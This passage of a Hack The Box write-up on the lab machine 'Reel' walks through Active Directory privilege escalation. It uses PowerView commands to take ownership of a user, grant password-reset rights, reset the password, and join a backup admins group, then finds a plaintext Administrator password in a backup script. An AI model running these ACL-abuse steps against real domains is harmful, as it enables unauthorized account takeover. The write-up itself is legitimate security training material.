PS C:\Users\tom\desktop\ad audit\bloodhound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
```
Then we change the Access Control List (ACL) of the claire AD object to give ourselves (Tom) the right to reset claire's password:

```powershell
PS C:\Users\tom\desktop\ad audit\bloodhound> Add-ObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
```

Then we choose a new password for the account and convert it to the SecureString format, which is what PowerShell uses it for passwords:

```powershell
PS C:\Users\tom\desktop\ad audit\bloodhound> $password= ConvertTo-SecureString 'Password_123!' -AsPlainText -Force
```

Now we can change claire's password with the one of our choice:

```powershell
PS C:\Users\tom\desktop\ad audit\bloodhound> Set-DomainUserPassword -Identity claire -AccountPassword $password
```

In order to add users to group we must provide valid user credentials so we declare a PSCredential object to contain username and password for claire, since she's the one with the write access to the Backup_Admins group:

```powershell
PS C:\Users\tom\desktop\ad audit\bloodhound> $creds = New-Object System.Management.Automation.PSCredential('HTB\claire',$password)
```

And we use it to add ourselves to the Backup_Admins group:

```powershell
PS C:\Users\tom\desktop\ad audit\bloodhound> Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Credential $creds
```

After doing this we can login through SSH with the new password we have set for claire:

```a
User: claire
Pass: Password_123!
```

And we are part of the Backup_Admins group:

```a
┌─[baud@parrot]─[~/reel]
└──╼ $ssh claire@10.10.10.77
claire@10.10.10.77's password:

Microsoft Windows [Version 6.3.9600]                                       
(c) 2013 Microsoft Corporation. All rights reserved.                       

claire@REEL C:\Users\claire>whoami /all                                    

USER INFORMATION                                                           
----------------                                                           

User Name  SID                                                             
========== ==============================================                  
htb\claire S-1-5-21-2648318136-3688571242-2924127574-1130                  

GROUP INFORMATION                                                          
-----------------                                                          

Group Name                                  Type             SID                Attributes 
                                                                           
=========================================== ================ ==============
================================ ==========================================
========
Everyone                                    Well-known group S-1-1-0 
                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Hyper-V Administrators              Alias            S-1-5-32-578  
                                 Mandatory group, Enabled by default, Enabled group                                                                   
BUILTIN\Users                               Alias            S-1-5-32-545  
                                 Mandatory group, Enabled by default, Enabled group                                                                   
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554  
                                 Mandatory group, Enabled by default, Enabled group                                                                   
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2       
                                 Mandatory group, Enabled by default, Enabled group                                                                   
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11      
                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15      
                                 Mandatory group, Enabled by default, Enabled group
HTB\Backup_Admins                           Group            S-1-5-21-26483
18136-3688571242-2924127574-1135 Mandatory group, Enabled by default, Enabled group     
HTB\MegaBank_Users                          Group            S-1-5-21-26483
18136-3688571242-2924127574-1604 Mandatory group, Enabled by default, Enabled group                                                                   
HTB\DR_Site                                 Group            S-1-5-21-26483
18136-3688571242-2924127574-1143 Mandatory group, Enabled by default, Enabled group  
HTB\Restrictions                            Group            S-1-5-21-26483
18136-3688571242-2924127574-1146 Mandatory group, Enabled by default, Enabled group     
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10   
                                 Mandatory group, Enabled by default, Enabled group  

Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448   


PRIVILEGES INFORMATION                                                     
----------------------                                                     

Privilege Name                Description                    State         
============================= ============================== =======       
SeMachineAccountPrivilege     Add workstations to domain     Enabled       
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled       
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled       


USER CLAIMS INFORMATION                                                    
-----------------------                                                    

User claims unknown.                                                       

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We can open Administrator's desktop but the flag is still out of our reach:

```a
claire@REEL C:\Users\Administrator\Desktop>dir                             
Volume in drive C has no label.                                           
Volume Serial Number is CC8A-33E1                                         

Directory of C:\Users\Administrator\Desktop                               

01/21/2018  03:56 PM    <DIR>          .                                   
01/21/2018  03:56 PM    <DIR>          ..                                  
11/02/2017  10:47 PM    <DIR>          Backup Scripts                      
10/28/2017  12:56 PM                32 root.txt                            
               1 File(s)             32 bytes                              
               3 Dir(s)  15,727,362,048 bytes free                         

claire@REEL C:\Users\Administrator\Desktop>more root.txt                   
Cannot access file C:\Users\Administrator\Desktop\root.txt
```

---

## Finding the "hidden" Administrator credentials

Still, we can access all the files inside the "Backup Scripts" folder and one of them contains the credentials of the Administrator account right at the beginning of the file:

```a
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir              
Volume in drive C has no label.                                           
Volume Serial Number is CC8A-33E1                                         

Directory of C:\Users\Administrator\Desktop\Backup Scripts                

11/02/2017  10:47 PM    <DIR>          .                                   
11/02/2017  10:47 PM    <DIR>          ..                                  
11/04/2017  12:22 AM               845 backup.ps1                          
11/02/2017  10:37 PM               462 backup1.ps1                         
11/04/2017  12:21 AM             5,642 BackupScript.ps1                    
11/02/2017  10:43 PM             2,791 BackupScript.zip                    
11/04/2017  12:22 AM             1,855 folders-system-state.txt            
11/04/2017  12:22 AM               308 test2.ps1.txt                       
               6 File(s)         11,903 bytes                              
               2 Dir(s)  15,725,789,184 bytes free                         

claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                                                       
# admin password                                                           
$password="Cr4ckMeIfYouC4n!"                                               

#Variables, only Change here                                               
$Destination="\\BACKUP03\BACKUP" #Copy the Files to this Location          
$Versions="50" #How many of the last Backups you want to keep              
$BackupDirs="C:\Program Files\Microsoft\Exchange Server" #What Folders youwant to backup                                                             
$Log="Log.txt" #Log Name                                                   
$LoggingLevel="1" #LoggingLevel only for Output in Powershell Window, 1=smart, 3=Heavy
[....]
```

We have found the last pair of credentials we needed:

```a
User: Administrator
Pass: Cr4ckMeIfYouC4n!
```

Login using SSH again and finish the challenge by grabbing the root.txt flag:

![img](/images/writeup-reel/7.png)

With this a very fun challenge ends, hopefully new HTB boxes follow this same style of realistic scenario instead of going for more CTF-like challenges as I have seen recently.